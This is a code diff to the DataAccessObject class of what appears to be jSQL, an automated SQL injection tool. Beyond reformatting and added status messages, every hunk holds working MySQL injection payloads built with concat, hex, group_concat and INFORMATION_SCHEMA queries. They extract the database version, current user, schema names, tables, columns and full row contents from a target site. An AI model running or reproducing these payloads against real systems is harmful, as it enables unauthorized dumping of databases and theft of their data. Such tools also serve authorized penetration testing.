@@ -19,7 +19,6 @@ import com.jsql.exception.PreparationException;
 import com.jsql.exception.StoppableException;
 import com.jsql.model.InjectionModel;
 import com.jsql.model.Interruptable;
-import com.jsql.model.InjectionModel.Stoppable_loopIntoResults;
 import com.jsql.model.bean.Column;
 import com.jsql.model.bean.Database;
 import com.jsql.model.bean.ElementDatabase;
@@ -39,26 +38,29 @@ public class DataAccessObject {
      * => version{%}database{%}user{%}CURRENT_USER
      */
     public void getDBInfos() throws PreparationException, StoppableException {
+    	model.sendMessage("Fetching informations...");
+        
         String[] sourcePage = {""};
 
         String hexResult = model.new Stoppable_loopIntoResults(model).action(
-                "concat(" +
-                        "hex(" +
-                        "concat_ws(" +
-                        "0x7b257d," +
-                        "version()," +
-                        "database()," +
-                        "user()," +
-                        "CURRENT_USER" +
-                        ")" +
-                        ")" +
-                        "," +
-                        "0x69" +
-                        ")",
-                        sourcePage,
-                        false,
-                        0,
-                        null);
+            "concat(" +
+                "hex(" +
+		            "concat_ws(" +
+			            "0x7b257d," +
+			            "version()," +
+			            "database()," +
+			            "user()," +
+			            "CURRENT_USER" +
+		            ")" +
+                ")" +
+                "," +
+                "0x69" +
+            ")",
+            sourcePage,
+            false,
+            0,
+            null
+        );
 
         if(hexResult.equals("")){
             model.sendResponseFromSite( "Show db info failed", sourcePage[0].trim() );
@@ -85,34 +87,36 @@ public class DataAccessObject {
      * The process can be stopped by the user
      */
     public void listDatabases() throws PreparationException, StoppableException {
+    	model.sendMessage("Fetching databases...");
+        
         String[] sourcePage = {""};
         String hexResult = model.new Stoppable_loopIntoResults(model).action(
+            "select+" +
+                "concat(" +
+	                "group_concat(" +
+		                "0x6868," +
+		                "r," +
+		                "0x6a6a," +
+		                "hex(cast(q+as+char))," +
+		                "0x6868" +
+		                "+order+by+r+" +
+		                "separator+0x6767" +
+	                ")," +
+	                "0x69" +
+                ")" +
+            "from(" +
                 "select+" +
-                        "concat(" +
-                        "group_concat(" +
-                        "0x6868," +
-                        "r," +
-                        "0x6a6a," +
-                        "hex(cast(q+as+char))," +
-                        "0x6868" +
-                        "+order+by+r+" +
-                        "separator+0x6767" +
-                        ")," +
-                        "0x69" +
-                        ")" +
-                        "from(" +
-                        "select+" +
-                        "hex(cast(TABLE_SCHEMA+as+char))r," +
-                        "count(TABLE_NAME)q+" +
-                        "from+" +
-                        "INFORMATION_SCHEMA.tables+" +
-                        "group+by+r{limit}" +
-                        ")x",
-                        sourcePage,
-                        true,
-                        0,
-                        null
-                );
+	                "hex(cast(TABLE_SCHEMA+as+char))r," +
+	                "count(TABLE_NAME)q+" +
+                "from+" +
+                	"INFORMATION_SCHEMA.tables+" +
+                "group+by+r{limit}" +
+            ")x",
+            sourcePage,
+            true,
+            0,
+            null
+        );
 
         // Parse all data we have retrieved
         Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
@@ -159,35 +163,35 @@ public class DataAccessObject {
 
         String[] pageSource = {""};
         String hexResult = model.new Stoppable_loopIntoResults(model, interruptable).action(
+            "select+" +
+                "concat(" +
+	                "group_concat(" +
+		                "0x6868," +
+		                "hex(cast(r+as+char))," +
+		                "0x6a6a," +
+		                "hex(cast(ifnull(q,0x30)+as+char))," +
+		                "0x6868+" +
+		                "order+by+r+" +
+		                "separator+0x6767" +
+	                ")," +
+	                "0x69" +
+                ")" +
+            "from(" +
                 "select+" +
-                        "concat(" +
-                        "group_concat(" +
-                        "0x6868," +
-                        "hex(cast(r+as+char))," +
-                        "0x6a6a," +
-                        "hex(cast(ifnull(q,0x30)+as+char))," +
-                        "0x6868+" +
-                        "order+by+r+" +
-                        "separator+0x6767" +
-                        ")," +
-                        "0x69" +
-                        ")" +
-                        "from(" +
-                        "select+" +
-                        "TABLE_NAME+r," +
-                        "table_rows+q+" +
-                        "from+" +
-                        "information_schema.tables+" +
-                        "where+" +
-                        "TABLE_SCHEMA=0x" + StringTool.strhex(database.toString())  + "+" +
-                        "order+by+r{limit}" +
-                        ")x"
-                        ,
-                        pageSource,
-                        true,
-                        Integer.parseInt(tableCount),
-                        database
-                );
+	                "TABLE_NAME+r," +
+	                "table_rows+q+" +
+                "from+" +
+                	"information_schema.tables+" +
+                "where+" +
+                	"TABLE_SCHEMA=0x" + StringTool.strhex(database.toString())  + "+" +
+                "order+by+r{limit}" +
+            ")x"
+	        ,
+	        pageSource,
+	        true,
+	        Integer.parseInt(tableCount),
+	        database
+        );
 
         // Parse all the data we have retrieved
         Matcher regexSearch =
@@ -239,35 +243,35 @@ public class DataAccessObject {
 
         String[] pageSource = {""};
         String hexResult = model.new Stoppable_loopIntoResults(model, interruptable).action(
+            "select+" +
+                "concat(" +
+	                "group_concat(" +
+		                "0x6868," +
+		                "hex(cast(n+as+char))," +
+		                "0x6a6a," +
+		                "0x3331," +
+		                "0x6868+" +
+		                "order+by+n+" +
+		                "separator+0x6767" +
+	                ")," +
+	                "0x69" +
+                ")" +
+            "from(" +
                 "select+" +
-                        "concat(" +
-                        "group_concat(" +
-                        "0x6868," +
-                        "hex(cast(n+as+char))," +
-                        "0x6a6a," +
-                        "0x3331," +
-                        "0x6868+" +
-                        "order+by+n+" +
-                        "separator+0x6767" +
-                        ")," +
-                        "0x69" +
-                        ")" +
-                        "from(" +
-                        "select+" +
-                        "COLUMN_NAME+n+" +
-                        "from+" +
-                        "information_schema.columns+" +
-                        "where+" +
-                        "TABLE_SCHEMA=0x"+StringTool.strhex(table.getParent().toString())+"+" +
-                        "and+" +
-                        "TABLE_NAME=0x"+StringTool.strhex(table.toString())+"+" +
-                        "order+by+n{limit}" +
-                        ")x",
-                        pageSource,
-                        true,
-                        0,
-                        table
-                );
+                	"COLUMN_NAME+n+" +
+                "from+" +
+                	"information_schema.columns+" +
+                "where+" +
+                	"TABLE_SCHEMA=0x"+StringTool.strhex(table.getParent().toString())+"+" +
+                	"and+" +
+                	"TABLE_NAME=0x"+StringTool.strhex(table.toString())+"+" +
+                "order+by+n{limit}" +
+            ")x",
+            pageSource,
+            true,
+            0,
+            table
+        );
 
         // Parse all the data we have retrieved
         Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
@@ -336,26 +340,26 @@ public class DataAccessObject {
 
         String[] pageSource = {""};
         String hexResult = model.new Stoppable_loopIntoResults(model, interruptable).action(
-                "select+concat(" +
-                        "group_concat(" +
-                        "0x6868," +
-                        "r," +
-                        "0x6a6a," +
-                        "hex(cast(q+as+char))," +
-                        "0x6868" +
-                        "+order+by+r+separator+0x6767" +
-                        ")," +
-                        "0x69" +
-                        ")from(" +
-                        "select+" +
-                        "hex(cast(concat("+ formatListColumn +")as+char))r," +
-                        "count(*)q+" +
-                        "from+" +
-                        "`"+ database +"`.`"+ table +"`+" +
-                        "group+by+r{limit}" +
-                        ")x"
-                        , pageSource, true, rowCount, table
-                );
+            "select+concat(" +
+                "group_concat(" +
+	                "0x6868," +
+	                "r," +
+	                "0x6a6a," +
+	                "hex(cast(q+as+char))," +
+	                "0x6868" +
+	                "+order+by+r+separator+0x6767" +
+                ")," +
+                "0x69" +
+            ")from(" +
+                "select+" +
+	                "hex(cast(concat("+ formatListColumn +")as+char))r," +
+	                "count(*)q+" +
+                "from+" +
+                	"`"+ database +"`.`"+ table +"`+" +
+                "group+by+r{limit}" +
+            ")x"
+            , pageSource, true, rowCount, table
+        );
 
         // Parse all the data we have retrieved
         Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
